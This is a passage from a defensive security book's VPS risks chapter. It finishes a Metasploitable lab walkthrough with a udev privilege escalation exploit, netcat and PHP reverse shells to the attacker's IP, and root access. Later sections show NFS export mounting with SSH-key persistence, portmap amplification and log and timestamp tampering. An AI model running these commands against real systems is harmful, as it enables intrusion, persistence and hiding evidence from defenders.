In the video metasploitable was running at 192.168.56.21 for starters. After this I had to change the virtual adapter, so that it could also connect to the outside world to fetch my payload. It ended up running on 192.168.0.232. My attacking machine also changed from 192.168.56.20 to 192.168.0.12</p>

  <p>Now we have a shell. Let us test it.</p>

  <p><code>pwd</code><br />
<code>/tmp</code><br />
<code>whoami</code><br />
<code>daemon</code>  </p>

  <p>All following commands can be run through our low privilege user.</p>

  <p>Running <code>unix-privesc-check</code> and directing the output to a file shows us:<br />
<code>I: [group_writable] /tmp is owned by user root (group root) and is group-writable (drwxrwxrwt)</code></p>

  <p>What about a file system that is mounted with permissions that will allow us to write a file that may be executed by one of the previously mentioned privileged services?  </p>

  <p><code>mount</code><br />
Shows us that we have very little in the way of granular partitioning and we have <code>/</code> mounted as <code>rw</code>, so as a low privileged user, we can both write and execute files in <code>/tmp</code> for example.  </p>

  <p>We could also just search for Privilege Escalation exploits targeting our targets kernel.<br />
Let us get the targets Kernel version: <code>uname -a</code> produces:<br />
<code>2.6.24</code></p>

  <p>This (<a href="https://www.exploit-db.com/exploits/8572/">https://www.exploit-db.com/exploits/8572/</a>) looks like an interesting one. Can we compile this on the target though? Let us see if we have <code>gcc</code> handy:<br />
<code>dpkg -l gcc</code><br />
We do.</p>

</aside>

<aside class="generic_inbar blurb bomb icon-bomb">
  
  <p>udev is a device manager running as root for the Linux kernel. Before version 1.4.1 it did not verify whether a netlink message originated from kernel or user space,<br />
which allowed users to supply their own, which we see in the exploit:<br />
<code>sendmsg(sock, &amp;msg, 0);</code></p>

  <p>The exploit will run our payload that we will create soon which will open a reverse root shell (because udev is running as root) back to our attacking box.<br />
We need to pass the PID of the netlink socket as an argument.<br />
When a device is removed, the exploit leverages the <code>95-udev-late.rules</code> functionality which runs arbitrary commands (which we are about to create in <code>/tmp/run</code>) via the <code>REMOVE_CMD</code> in the exploit.<br />
You can also see within the exploit that it adds executable permissions to our reverse shell payload. Now if we had <code>/tmp</code> mounted as we do in the <code>/etc/fstab</code> in the Countermeasures section, neither <code>/tmp/run</code> or <code>/tmp/privesc</code> would be able to execute.  </p>

  <p>Through our daemon shell that <code>distcc_exec</code> provided, let us fetch the exploit:<br />
<code>wget --no-check-certificate https://www.exploit-db.com/download/8572 -O privesc.c</code><br />
The <code>no-check</code> is required because metasploitable does not have the relevant CA cert installed.<br />
Now check that the file has the contents that you expect.<br />
<code>cat privesc.c</code></p>

  <p>Let us compile it:<br />
<code>gcc privesc.c -o privesc</code><br />
<code>ls -liah</code><br />
<code>privesc</code></p>

  <p>Now we need the PID of the udevd netlink socket<br />
<code>cat /proc/net/netlink</code><br />
Gives us <code>2299</code><br />
And to check:<br />
<code>ps -aux | grep udev</code><br />
Gives us <code>2300</code> which should be one more than netlink.</p>

  <p>Now we need something on the target to use to open a reverse shell. Netcat may not be available on a production web server, but if it is:<br />
Open a connection to 192.168.0.12:1234, then run <code>/bin/bash</code><br />
<code>echo '#!/bin/bash' &gt; run</code><br />
<code>echo '/bin/netcat -e /bin/bash 192.168.0.12 1234' &gt;&gt; run</code><br />
Another alternative is using php<br />
<code>echo '#!/bin/bash' &gt; run</code><br />
<code>echo "php -r '\$sock=fsockopen(\"192.168.0.12\",1234);exec(\"/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'" &gt;&gt; run</code><br />
There are also many other options <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">here</a> to use for providing a reverse shell.</p>

</aside>

<aside class="generic_inbar blurb bomb icon-bomb">
  
  <p>On the attacking side:<br />
<code>nc -lvp 1234</code><br />
<code>Listening on [any] 1234 ...</code></p>

  <p>Now from our low privilege shell, user supplies message from user space (seen within the exploit) along with the PID of netlink:<br />
<code>./privesc 2299</code></p>

  <p>You should see movement on the listening netcat now.<br />
<code>connect to [192.168.0.12] from metasploitable [192.168.0.232] 43542</code><br />
<code>whoami</code><br />
<code>root</code></p>

  <p>and that is our privilege escalation, we now have root.</p>

</aside>

<p>The Countermeasures sections that address are:</p>

<ol class="numeric">
  <li><a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-partitioning-on-os-installation">Partitioning on OS Installation</a></li>
  <li>
<a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions">Lock Down the Mounting of Partitions</a>, which also briefly touches on the improving file permissions and ownership</li>
</ol>

<h5 id="leanpub-auto-weak-password-strategies">Weak Password Strategies</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----difficult-common-average-severe.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>This same concept was covered in the People chapter of Fascicle 0, which also applies to VPS. In addition to that, the risks are addressed within the <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies">countermeasures</a> section.</p>

<h5 id="leanpub-auto-root-logins">Root Logins</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----average-common-average-severe.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Allowing root logins is a lost opportunity for another layer of defence in depth, where the user must elevate privilages before performaning any task that could possibly negativly impact the system. Once an attacker is root on a system, the system is owned by them. Root is a user and no guess work is required for that username. Other low privilaged users require some guess work on the part of the username as well as the password, and even once both parts of a low privaleged credential have been aquired, there is another step to total system ownership.</p>

<h5 id="leanpub-auto-ssh">SSH</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----difficult-uncommon-average-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>You may remember we did some fingerprinting of the SSH daemon in the Reconnaissance section of the Processes and Practises chapter in <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>. SSH in itself has been proven to be solid. In saying that, SSH is only as strong as the weakest link involved. For example, if you are using the default of password authentication and have not configured which remote hosts can or can not access the server, and chose to use a weak password, then your SSH security is only as strong as the password. There are many configurations that a default install of SSH uses in order to get up and running quickly, that need to be modified in order to harden SSH. Using SSH in this manner can be convienient initially, but it is always recommended to move from the defaults to a more secure model of usage. I cover many techniques for configuring and hardening SSH in the <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh">SSH Countermeasures</a> section.</p>

<h5 id="leanpub-auto-to-many-boot-options">To Many Boot Options</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----difficult-uncommon-difficult-severe.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Being able to boot from alternative media to that of your standard OS, provides additional opportunity for an attacker to install a root-kit on your machine, whether it be virtual or real media.</p>

<h5 id="vps-identify-risks-unnecessary-and-vulnerable-services-portmap">Portmap</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----easy-common-easy-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>An attacker can probe the Open Network Computing Remote Procedure Call (ONC RPC) port mapper service on the target host, where the target host is an IP address or a host name.</p>

<p>If installed, the <code>rpcinfo</code> command with <code>-p</code> will list all RPC programs (such as <code>quotad</code>, <code>nfs</code>, <code>nlockmgr</code>, <code>mountd</code>, <code>status</code>, etc) registered with the port mapper (whether the depricated <code>portmap</code> or the newer <code>rpcbind</code>). Many RPC programs are vulnerable to a collection of attacks. </p>

<figure class="code">
  <figcaption>rpcinfo</figcaption>

<div class="highlight"><pre><code></code>rpcinfo -p &lt;target host&gt; 
</pre></div>

</figure>

<figure class="code">
  <figcaption>rpcinfo results for Metasploitable2</figcaption>

<div class="highlight"><pre><code></code>program vers proto   port  service
<code class="m">100000</code>    <code class="m">4</code>   tcp    <code class="m">111</code>  portmapper
<code class="m">100000</code>    <code class="m">3</code>   tcp    <code class="m">111</code>  portmapper
<code class="m">100000</code>    <code class="m">2</code>   tcp    <code class="m">111</code>  portmapper
<code class="m">100000</code>    <code class="m">4</code>   udp    <code class="m">111</code>  portmapper
<code class="m">100000</code>    <code class="m">3</code>   udp    <code class="m">111</code>  portmapper
<code class="m">100000</code>    <code class="m">2</code>   udp    <code class="m">111</code>  portmapper
<code class="m">100000</code>    <code class="m">4</code>     <code class="m">7</code>    <code class="m">111</code>  portmapper
<code class="m">100000</code>    <code class="m">3</code>     <code class="m">7</code>    <code class="m">111</code>  portmapper
<code class="m">100000</code>    <code class="m">2</code>     <code class="m">7</code>    <code class="m">111</code>  portmapper
<code class="m">100005</code>    <code class="m">1</code>   udp    <code class="m">649</code>  mountd
<code class="m">100003</code>    <code class="m">2</code>   udp   <code class="m">2049</code>  nfs
<code class="m">100005</code>    <code class="m">3</code>   udp    <code class="m">649</code>  mountd
<code class="m">100003</code>    <code class="m">3</code>   udp   <code class="m">2049</code>  nfs
<code class="m">100024</code>    <code class="m">1</code>   udp    <code class="m">600</code>  status
<code class="m">100005</code>    <code class="m">1</code>   tcp    <code class="m">649</code>  mountd
<code class="m">100024</code>    <code class="m">1</code>   tcp    <code class="m">868</code>  status
<code class="m">100005</code>    <code class="m">3</code>   tcp    <code class="m">649</code>  mountd
<code class="m">100003</code>    <code class="m">2</code>   tcp   <code class="m">2049</code>  nfs
<code class="m">100003</code>    <code class="m">3</code>   tcp   <code class="m">2049</code>  nfs
<code class="m">100021</code>    <code class="m">0</code>   udp    <code class="m">679</code>  nlockmgr
<code class="m">100021</code>    <code class="m">0</code>   tcp    <code class="m">875</code>  nlockmgr
<code class="m">100021</code>    <code class="m">1</code>   udp    <code class="m">679</code>  nlockmgr
<code class="m">100021</code>    <code class="m">1</code>   tcp    <code class="m">875</code>  nlockmgr
<code class="m">100021</code>    <code class="m">3</code>   udp    <code class="m">679</code>  nlockmgr
<code class="m">100021</code>    <code class="m">3</code>   tcp    <code class="m">875</code>  nlockmgr
<code class="m">100021</code>    <code class="m">4</code>   udp    <code class="m">679</code>  nlockmgr
<code class="m">100021</code>    <code class="m">4</code>   tcp    <code class="m">875</code>  nlockmgr
</pre></div>

</figure>

<p>This provides a list of RPC services running that have registered with the port mapper, thus providing an attacker with a lot of useful information to take into the Vulnerability Searching stage discussed in the Process and Practises chapter of <a href="https://leanpub.com/holistic-infosec-for-web-developers">Fascicle 0</a>.</p>

<p>The deprecated <code>portmap</code> service as well as the newer <code>rpcbind</code>, listen on port 111 for requesting clients, some Unix and Solaris versions will also listen on ports above 32770.</p>

<p>Besides providing the details of RPC services, <code>portmap</code> and <code>rpcbind</code> are inherently vulnerable to DoS attacks, specifically reflection and amplification attacks, in fact that is why. Clients make a request and the port mapper will respond with all the RPC servers that have registered with it, thus the response is many times larger than the request. This serves as an excellent vector for DoS, saturating the network with amplified responses.</p>

<p>These types of attacks have become very popular amongst distributed attackers due to their significant impact, lack of sophistication and ease of execution. Level 3 Threat Research Labs published a <a href="http://blog.level3.com/security/a-new-ddos-reflection-attack-portmapper-an-early-warning-to-the-industry/">blog post</a> on this port mapper DoS attack and how it has become very popular since the beginning of August 2015.<br />
US-CERT also published an <a href="https://www.us-cert.gov/ncas/alerts/TA14-017A">alert</a> on UDP-Based Amplification Attacks outlining the Protocols, Bandwidth Amplification Factor, etc.</p>

<figure class="code" id="vps-identify-risks-unnecessary-and-vulnerable-services-portmap-rpcinfo-t">
  <figcaption>rpcinfo</figcaption>

<div class="highlight"><pre><code></code>rpcinfo -T udp &lt;target host&gt; 
</pre></div>

</figure>

<figure class="code">
  <figcaption>rpcinfo results for Metasploitable2</figcaption>

<div class="highlight"><pre><code></code>program version netid     address                service    owner
<code class="m">100000</code>    <code class="m">2</code>    tcp       <code class="m">0</code>.0.0.0.0.111          portmapper unknown
<code class="m">100024</code>    <code class="m">1</code>    udp       <code class="m">0</code>.0.0.0.130.255        status     unknown
<code class="m">100024</code>    <code class="m">1</code>    tcp       <code class="m">0</code>.0.0.0.138.110        status     unknown
<code class="m">100003</code>    <code class="m">2</code>    udp       <code class="m">0</code>.0.0.0.8.1            nfs        unknown
<code class="m">100003</code>    <code class="m">3</code>    udp       <code class="m">0</code>.0.0.0.8.1            nfs        unknown
<code class="m">100003</code>    <code class="m">4</code>    udp       <code class="m">0</code>.0.0.0.8.1            nfs        unknown
<code class="m">100021</code>    <code class="m">1</code>    udp       <code class="m">0</code>.0.0.0.167.198        nlockmgr   unknown
<code class="m">100021</code>    <code class="m">3</code>    udp       <code class="m">0</code>.0.0.0.167.198        nlockmgr   unknown
<code class="m">100021</code>    <code class="m">4</code>    udp       <code class="m">0</code>.0.0.0.167.198        nlockmgr   unknown
<code class="m">100003</code>    <code class="m">2</code>    tcp       <code class="m">0</code>.0.0.0.8.1            nfs        unknown
<code class="m">100003</code>    <code class="m">3</code>    tcp       <code class="m">0</code>.0.0.0.8.1            nfs        unknown
<code class="m">100003</code>    <code class="m">4</code>    tcp       <code class="m">0</code>.0.0.0.8.1            nfs        unknown
<code class="m">100021</code>    <code class="m">1</code>    tcp       <code class="m">0</code>.0.0.0.151.235        nlockmgr   unknown
<code class="m">100021</code>    <code class="m">3</code>    tcp       <code class="m">0</code>.0.0.0.151.235        nlockmgr   unknown
<code class="m">100021</code>    <code class="m">4</code>    tcp       <code class="m">0</code>.0.0.0.151.235        nlockmgr   unknown
<code class="m">100005</code>    <code class="m">1</code>    udp       <code class="m">0</code>.0.0.0.235.25         mountd     unknown
<code class="m">100005</code>    <code class="m">1</code>    tcp       <code class="m">0</code>.0.0.0.182.4          mountd     unknown
<code class="m">100005</code>    <code class="m">2</code>    udp       <code class="m">0</code>.0.0.0.235.25         mountd     unknown
<code class="m">100005</code>    <code class="m">2</code>    tcp       <code class="m">0</code>.0.0.0.182.4          mountd     unknown
<code class="m">100005</code>    <code class="m">3</code>    udp       <code class="m">0</code>.0.0.0.235.25         mountd     unknown
<code class="m">100005</code>    <code class="m">3</code>    tcp       <code class="m">0</code>.0.0.0.182.4          mountd     unknown
<code class="m">100000</code>    <code class="m">2</code>    udp       <code class="m">0</code>.0.0.0.0.111          portmapper unknown
</pre></div>

</figure>

<p>You will notice in the response as recorded by Wireshark, that the length is many times larger than the request, 726 bytes in this case, hence the reflected amplification:</p>

<figure class="code">
  <figcaption>Wireshark results</figcaption>

<div class="highlight"><pre><code></code>Source      Destination Protocol Length Info
&lt;<code class="nb">source</code> IP&gt; &lt;dest IP&gt;   Portmap  <code class="m">82</code>     V3 DUMP Call <code class="o">(</code>Reply In <code class="m">76</code><code class="o">)</code>
&lt;dest IP&gt;   &lt;<code class="nb">source</code> IP&gt; Portmap  <code class="m">726</code>    V3 DUMP Reply <code class="o">(</code>Call In <code class="m">75</code><code class="o">)</code>
</pre></div>

</figure>

<p>The packet capture in Wireshark which is not showen here also confirms that it is UDP.</p>

<h5 id="leanpub-auto-exim">EXIM</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----difficult-uncommon-difficult-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Exim, along with offerings such as Postfix, Sendmail, Qmail, etc, are Mail Transfer Agents (MTAs), which on a web server are probably not required.</p>

<p>There have been plenty of exploits created for Exim security defects. Most of the defects I have seen have patches for, so if Exim is a necessity, stay up to date with your patching. If you are still on a stable (jessie at the time of writing) and can not update to a testing release, make sure to use backports.</p>

<p>At the time of writing this, the very front page of the <a href="www.exim.org">Exim website</a> states All versions of Exim previous to version 4.87 are now obsolete and everyone is very strongly recommended to upgrade to a current release..</p>

<p>Jessie (stable) uses Exim 4.84.2 where as jessie-backports uses Exim 4.87,<br />
which 4.86.2 was patched for the likes of <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1531">CVE-2016-1531</a>. Now if we have a look at the first exploit for this vulnerability (<a href="https://www.exploit-db.com/exploits/39535/">https://www.exploit-db.com/exploits/39535/</a>) and dissect it a little:</p>

<p>The Perl shell environment variable <code>$PERL5OPT</code> can be assigned  options, these options will be interpreted as if they were on the <code>#!</code> line at the beginning of the script. These options will be treated as part of the command run, after any optional switches included on the command line are accepted. </p>

<p><code>-M</code>, which is one of the allowed switches (<code>-</code>[<code>DIMUdmw</code>]) to be used with <code>$PERL5OPT</code> allows us to attempt to use a module from the command line, so with <code>-Mroot</code> we are trying to use the <code>root</code> module, then <code>PERL5OPT=-Mroot</code> effectively puts <code>-Mroot</code> on the first line like the following, which runs the script as root:</p>

<p><code>#!perl -Mroot</code> </p>

<p>The Perl shell environment variable <code>$PERL5LIB</code> is used to specify a colon (or semicolon on Windows) separated list of directories in which to look for Perl library files before looking in the standard library and the current directory.</p>

<p>Assigning <code>/tmp</code> to <code>$PERL5LIB</code> immediately before the exploit is run, means the first place execution will look for the root module is in the <code>/tmp</code> directory.</p>

<h5 id="vps-identify-risks-unnecessary-and-vulnerable-services-nis">NIS</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----difficult-uncommon-difficult-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p><strong>Some History</strong>:</p>

<p>NIS+ was introduced as part of Solaris 2 in 1992 with the intention that it would eventually replace Network Information Service (NIS), originally known as Yellow Pages (YP). NIS+ featured stronger security, authentication, greater scalability and flexibility, but it was more difficult to set up, administer and migrate to, so many users stuck with NIS. NIS+ was removed from Solaris 11 at the end of 2012. Other more secure distributed directory systems such as Lightweight Directory Access Protocol (LDAP) have come to replace NIS(+).</p>

<p><strong>What NIS is</strong>:</p>

<p>NIS is a Remote Procedure CAll (RPC) client/server system and a protocol providing a directory service, letting many machines in a network share a common set of configuration files with the same account information, such as the commonly local stored UNIX:</p>

<ul>
  <li>users</li>
  <li>their groups</li>
  <li>hostnames</li>
  <li>e-mail aliases</li>
  <li>etc</li>
  <li>and contents of the <code>/etc/passwd</code> and referenced <code>/etc/shadow</code> which contains the hashed passwords, discussed in detail under the <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies">Review Password Strategies</a> section</li>
</ul>

<p>The NIS master server maintains canonical database files called maps. We also have slave servers which have copies of these maps. Slave servers are notified by the master via the <code>yppush</code> program when any changes to the maps occur. The slaves then retrieve the changes from the master in order to synchronise their own maps. The NIS clients always communicate directly with the master, or a slave if the master is down or slow. Both master and slave(s) service all client requests through <code>ypserv</code>.</p>

<p><strong>Vulnerabilities and exploits</strong>:</p>

<p>NIS has had its day, it is vulnerable to many exploits, such as DoS attacks using the finger service against multiple clients, buffer overflows in libnasl, </p>

<p><em>lax authentication while querying of NIS maps (easy for a compromised client to take advantage of), as well as the various daemons each having their own individual issues. Not to mention that misconfiguration of NIS or netgroups can also provide easy holes that can be exploited. NIS databases can also be easily accessed by someone who doesnt belong on your network. How? They simply can guess the name of your NIS domain, bind their client to that domain, and run a ypcat command to get the information they are after.</em></p>

<blockquote>
  <p><a href="https://www.symantec.com/connect/articles/nfs-and-nis-security">Symantec - nfs and nis security</a></p>
</blockquote>

<p>NIS can run on unprivileged ports, which means that any user on the system(s) can run them. If a replacement version of these daemons was put in place of the original, then the attacker would have access to the resources that the daemons control.</p>

<h5 id="leanpub-auto-rpcbind">Rpcbind</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----easy-widespread-average-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p><code>rpcbind</code> listens on the same port(s) as the deprecated <a href="chap03.html#vps-identify-risks-unnecessary-and-vulnerable-services-portmap"><code>portmap</code></a> and suffers the same types of DoS attacks.</p>

<h5 id="vps-identify-risks-unnecessary-and-vulnerable-services-telnet">Telnet</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----easy-widespread-average-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>Provides a command line interface on a remote server via its application layer client-server protocol traditionally to port 23. Telnet was created and launched in 1969, provides no encryption, credentials are sent in plain text. There have been extensions to the Telnet protocol which provide Transport Layer Security (TLS) and Simple Authentication and Security Layer (SASL), many Telnet implementations do not support these though.</p>

<p>Telnet is still provided turned on, on many cheap hardware appliances, which continue to provide an excellent source of ownable resources for those looking to acquire computing devices illegally to launch attacks from. Many of these devices also never have their default credentials changed.</p>

<h5 id="leanpub-auto-ftp">FTP</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----easy-widespread-average-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>The FTP protocol was <a href="https://archive.fo/KyJUa">not designed with security in mind</a>, it does not use any form of encryption. The credentials you use to authenticate, all of your traffic including any sensitive information you have in the files that you send or receive, to or from the FTP server, will all be on the wire in plain text. Even if you think your files do not contain any sensitive information, often there will be details hiding, for example, if you are <code>[m]put</code>ting / <code>[m]get</code>ing source files, there could be database credentials or other useful bits of information in config files.</p>

<p>Many people have been using FTP for years, in many cases never even considering the fact that FTP adds no privacy to anything it touches.</p>

<p>Most FTP clients also store the users credentials in plain text, completely neglecting to consider defence in depth. It should be considered that your client machine is already compromised. If credentials are stored encrypted, then it is one more challenge that an attacker must conquer. All software created with security in mind realises this, and if they must store credentials, they will be hashed via a best of bread KDF (as discussed in the <a href="chap06.html#web-applications-countermeasures-data-store-compromise">Data-store Compromise</a> section of the Web Applications chapter) with the recommended number of iterations (as discussed in the <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies">Review Password Strategies</a> section a little later in this chapter). In regards to FTP, the clients are designed to store multiple credentials, one set for each site, the idea being that you dont have to remember them, so they need to be encrypted, rather than hashed (one way, not reversible), so they can be decrypted.</p>

<p>A couple of the most popular clients are:</p>

<p><strong>FileZilla</strong> (cross platform) FTP client stores your credentials in plain text. Yes, the UI conceals your password from shoulder surfers, but that is the extent of its security, basically none.</p>

<p><strong>WinSCP</strong> (Windows) is a FTP, <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-ftp-sftp">SFTP</a> and <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-ftp-scp">SCP</a> client for Windows. WinSCP has a number of ways in which you can have it deal with passwords. <a href="https://winscp.net/eng/docs/security_credentials">By default</a>, when a user enters their password on the authentication window, it is stored in memory and reused for all subsequent authentications during the same session. This is of course open to exploitation as is, also in-memory data can be swapped to disk, written to crash dump files and accessed by malware.</p>

<p>Another option is to store passwords along with other site specific configurations to the registry for installed WinSCP, or to an INI file (overridable) for the portable version. These passwords are stored obfuscated, as the documentation puts it <a href="https://winscp.net/eng/docs/security_credentials"><em>stored in a manner that they can easily be recovered</em></a>. If you are interested, you can check the <code>EncryptPassword</code> function on the WinSCP <a href="https://github.com/mirror/winscp/blob/master/source/core/Security.cpp#L34">github</a> mirror, in which a short and simple set of bitwise operations are performed on each character of the password and the user and host are concatenated as what looks to be some sort of pseudo-salt. Although this option exists, it is <a href="https://winscp.net/eng/docs/faq_password">recommended against</a>.</p>

<p>And here is why. The <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/parser/winscp.rb#L81">exploit</a> <code>decrypt_password</code> consumed by the <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/winscp.rb#L82"><code>winscp</code></a> <a href="https://www.rapid7.com/db/modules/post/windows/gather/credentials/winscp">metasploit module</a>. Additional details on the <a href="https://cosine-security.blogspot.co.nz/2011/04/stealing-winscp-saved-passwords.html">cosine-security blog</a>.</p>

<p>The recommended way to store the site specific passwords is to use a Master Password. This appears to use a <a href="https://github.com/mirror/winscp/blob/master/source/core/Cryptography.cpp">custom implementation</a> of the AES256 block cipher, with a hard-coded 1000 rounds of SHA1.</p>

<p>WinSCP provides a lot of options, which may or may not be a good thing.</p>

<h5 id="leanpub-auto-nfs">NFS</h5>

<figure class="image center" style="width: 395px;">
  <img src="images/ThreatTags----average-uncommon-average-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p><code>mountd</code> or <code>rpc.mount</code> is the NFS mount daemon, that listens and services NFS client requests to mount a file system.</p>

<p>If mounts are listed in the <code>/etc/fstab</code>, attempts will be made to mount them on system boot.</p>

<p>If the <code>mountd</code> daemon is listed in the output of the above <code>rpcinfo</code> command, the <code>showmount -e</code> command will be useful for listing the NFS servers list of exports defined in the servers <code>/etc/exports</code> file.</p>

<figure class="code">
  <figcaption>showmount</figcaption>

<div class="highlight"><pre><code></code>showmount -e &lt;target host&gt;
</pre></div>

</figure>

<figure class="code">
  <figcaption>showmount results</figcaption>

<div class="highlight"><pre><code></code>Export list <code class="k">for</code> &lt;target hsot&gt;:
/ <code class="o">(</code>anonymous<code class="o">)</code> <code class="c1"># If you're lucky as an attacker, anonymous means anyone can mount.</code>
/ * <code class="c1"># means all can mount the exported root directory.</code>
<code class="c1"># Probably because the hosts.allow has ALL:ALL and hosts.deny is blank.</code>
<code class="c1"># Which means all hosts from all domains are permitted access.</code>
</pre></div>

</figure>

<p>NFS is one of those protocols that you need to have some understanding on in order to achieve a level of security sufficient for your target environment. NFS provides no user authentication, only host based authentication. NFS relies on the AUTH_UNIX method of authentication, the user ID (UID) and group ID (GIDs) that the NFS client passes to the server are implicitly trusted.</p>

<figure class="code">
  <figcaption>Mount nfs export</figcaption>

<div class="highlight"><pre><code></code><code class="c1"># Make sure local rpcbind service is running:</code>
service rpcbind status
<code class="c1"># Should yield [ ok ] rpcbind is running.</code>
<code class="c1"># If not:</code>
service rpcbind start
mount -t nfs &lt;target host&gt;:/ /mnt
</pre></div>

</figure>

<p>All going well for the attacker, they will now have your VPSs <code>/</code> directory mounted to their <code>/mnt</code> directory. If you have not setup NFS properly, they will have full access to your entire file system.</p>

<p>To establish some persistence, an attacker may be able to add their SSH public key:</p>

<figure class="code">
<div class="highlight"><pre><code></code>cat ~/.ssh/id_rsa.pub &gt;&gt; /mnt/root/.ssh/authorized_keys
</pre></div>

</figure>

<p>The NFS daemon always listens on the unprivileged port 2049. An attacker without root privileges on a system can start a trojanised <code>nfsd</code> which will be bound to port 2049.</p>

<ul>
  <li>On a system that does not usually offer NFS, the attacker could then proceed to create a spear phishing attack, in which they lure the target to open a pdf or similar from the exported filesystem, or even using a fake (<a href="https://github.com/micheloosterhof/cowrie/blob/master/data/fs.pickle">pickled</a>) filesystem. As the export(s) would probably be on an internal network, target trust levels would be very high, or</li>
  <li>If they can find a way to stop an existing <code>nfsd</code> and run their own, clients may communicate with the trojanised <code>nfsd</code> and possibly consume similar exports. By replacing a NFS daemon with a trojanised replica, the attacker would also have access to the resources that the legitimate daemon controls.</li>
</ul>

<p>The ports that a Linux server will bind its daemons to are listed in <code>/etc/services</code>.</p>

<p>As well as various privilege escalation vulnerabilities, NFS has also suffered from various buffer overflow vulnerabilities.</p>

<h4 id="vps-identify-risks-lack-of-visibility">Lack of Visibility</h4>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----average-common-difficult-moderate.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>As I was writing this section, I realised that visibility is actually an asset, so I went back and added it actually to several chapters. Without visibility, an attacker can do a lot more damage than they could if you were watching them and able to react, or even if you have good auditing capabilities. It is in fact an asset that attackers often try and remove for this very reason.</p>

<p>Any attacker worth their weight will try to <a href="https://www.win.tue.nl/~aeb/linux/hh/hh-13.html">cover their tracks</a> as they progress. Once an attacker has shell access to a system, they may:</p>

<ul>
  <li>Check running processes to make sure that they have not left anything they used to enter still running</li>
  <li>Remove messages in logs related to their break (walk) in</li>
  <li>Same with the shell history file. Or even:<br />
<code>ln /dev/null ~/.bash_history -sf</code> so that all following history vanishes.</li>
  <li>They may change time stamps on new files with:<br />
<code>touch -r &lt;referenceFile&gt; &lt;fileThatGetsReferenceFileTimeStampsApplied&gt;</code><br />
Or better is to use the original date-time:
    <figure class="code">
<div class="highlight"><pre><code></code>  touch -r &lt;originalFile&gt; &lt;trojanFile&gt;
  mv &lt;trojanFile&gt; &lt;originalFile&gt;
</pre></div>

    </figure>
  </li>
  <li>Make sure any trojan files they drop are the same size as the originals</li>
  <li>Replace <code>md5sum</code> so that it contains sums for the files that were replaced including itself. Although if an administrator ran <code>rpm -V</code> or <code>debsums -c</code> (Debian, Ubuntu) it would not be affected by a modified <code>md5sum</code>.</li>
</ul>

<p>If an attacker wants their actions to be invisible, they may try replacing the likes of <code>ps</code>, <code>pstree</code>, <code>top</code>, <code>ls</code> and possibly <code>netstat</code> or <code>ss</code>, and/or many other tools that reveal information about the system, if they are trying to hide network activity from the host.</p>

<p>Taking things further, an attacker may load a kernel module that modifies the <code>readdir()</code> call and the <code>proc</code> filesystem so that any changes on the file system are untrustworthy, or if going to the length of loading custom modules, everything can be done from kernel space which is invisible until reboot.</p>

<p>Without visibility, an attacker can access your system(s) and, alter, <a href="https://github.com/m57/dnsteal">copy</a>, modify information without you knowing they did it. Even launch DoS attacks without you noticing anything before it is to late.</p>

<h4 id="vps-identify-risks-docker">Docker</h4>

<p>With the continual push for shorter development cycles, combined with continuous delivery, cloud and virtual based infrastructure, containers have become an important part of the continuous delivery pipeline. Docker has established itself as a top contender in this space.</p>

<p>Many of Dockers defaults favour ease of use over security, in saying that, Dockers security considerations follow closely. After working with Docker, the research I have performed in writing these sections on Docker security, and in having the chance to <a href="http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/">discuss</a> many of my concerns and preconceived ideas with the Docker Security team lead Diogo Mnica over this period, it is my belief that by default Docker containers, infrastructure and orchestration provide better security than running your applications in Virtual Machines (VMs). Just be careful when comparing containers with VMs, as this is analogous with comparing apples with oranges.</p>

<p>The beauty in terms of security that Docker provides is immense configurability to improve the security many times more than the defaults. In order to do this, you will have to invest some time and effort into learning about the possible issues, features and how to configure them. It is this visibility that I have attempted to create in these sections on Docker security.</p>

